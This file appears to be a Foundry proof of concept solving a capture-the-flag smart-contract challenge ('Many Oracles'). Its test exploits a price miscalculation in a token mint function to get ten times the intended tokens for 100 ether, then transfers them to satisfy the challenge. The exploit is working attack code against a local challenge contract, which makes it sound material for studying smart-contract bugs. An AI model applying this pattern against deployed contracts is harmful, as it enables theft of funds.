// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

/**
 * @title: Proof of Concept for Many Oracles Challenge
 * @author: @emilesean_es
 * @custom: Vulnerability category: Arithmetic & Calculation Errors
 * @custom: Attack Variant: Calculation Error in Price Calculation When Minting Tokens
 */
import {Setup as Victim} from "../src/Setup.sol";
import "forge-std/Test.sol";

contract POC is Test {

    Victim public victim;

    function setUp() public {
        victim = new Victim{value: 300 ether}();
        vm.label(address(victim), "Victim");
    }

    function testExploit() public {
        console.log("State before attack:");
        console.log("-------------------");
        console.log("Pair1 Token balance", (victim.pair1().reserve0()) / 1e18);
        console.log("Pair1 weth1 balance", (victim.pair1().reserve1()) / 1e18);
        console.log("Pair1 weth Token/weth1 price", (victim.pair1().getCurrentPrice()) / 1e18);

        console.log("Pair2 Token balance", (victim.pair2().reserve0()) / 1e18);
        console.log("Pair2 weth1 balance", (victim.pair2().reserve1()) / 1e18);
        console.log("Pair2 weth Token/weth1 price", (victim.pair2().getCurrentPrice()) / 1e18);
        console.log("Victim token balance", (victim.minter().balanceOf(address(victim))) / 1e18);
        console.log("-------------------");

        // Price is calculated wrongly in the mint function given 100 ether it mints 10_000 tokens instead of 1_000 given 1 ether equals 10 tokens. I can then use pair to swap tokens for weth1 and weth2 and then transfer the tokens to the victim contract to solve the challenge. In my case I just transferred 10_000 tokens to the victim contract solving challenge.

        victim.minter().mint{value: 100 ether}();
        console.log("Attacker token balance", (victim.minter().balanceOf(address(this))) / 1e18);
        victim.minter().transfer(address(victim), 10_000 ether);
        console.log("-------------------");
        console.log("State after attack:");
        console.log("Victim token balance", (victim.minter().balanceOf(address(victim))) / 1e18);
        assertTrue(victim.isSolved());
    }

}
